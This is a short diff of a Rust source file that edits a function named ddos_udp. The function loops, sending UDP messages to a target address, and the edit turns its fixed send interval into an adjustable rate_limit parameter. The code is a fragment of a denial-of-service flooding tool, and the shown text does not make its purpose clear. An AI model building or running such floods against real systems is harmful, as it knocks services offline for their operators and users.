@@ -18,13 +18,13 @@ async fn send_udp_message(server_addr: &str) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-pub(crate) async fn ddos_udp(rx: &mut mpsc::Receiver<()>, target_clone: String) {
+pub(crate) async fn ddos_udp(rx: &mut mpsc::Receiver<()>, target_clone: String, rate_limit: u64) {
 
     let mut cmp = 0;
 
     loop {
         tokio::select! {
-            _ = sleep(Duration::from_nanos(100000)) => {
+            _ = sleep(Duration::from_nanos(rate_limit)) => {
                 println!("cmp = {}", cmp);
                 send_udp_message(&target_clone).await.expect("Erreur lors de l'envoi du message UDP");
                 cmp += 1;
